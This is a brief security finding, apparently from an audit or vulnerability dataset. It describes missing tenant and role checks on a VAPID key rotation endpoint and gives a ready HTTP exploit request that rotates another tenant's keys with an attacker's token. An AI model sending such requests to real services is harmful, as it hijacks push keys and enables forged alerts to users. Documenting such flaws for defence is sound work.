diagnosis: The WebPush VAPID key rotation endpoint allows rotating cryptographic VAPID keypairs for any tenant specified in the URL path. It validates the caller's JWT, but fails to verify that the authenticated user belongs to tenantId or possesses the TENANT_ADMIN role. An attacker can rotate the VAPID keys of any enterprise tenant, obtain their new private VAPID key in the response, and sign malicious push alerts to all subscriber devices of that enterprise.
exploit_request:
POST /api/tenants/tenant_healthcare_network_99/push/vapid-keys/rotate HTTP/1.1
Host: push.notification-mesh.com:8101
Authorization: Bearer <attacker_customer_jwt>
Content-Length: 0
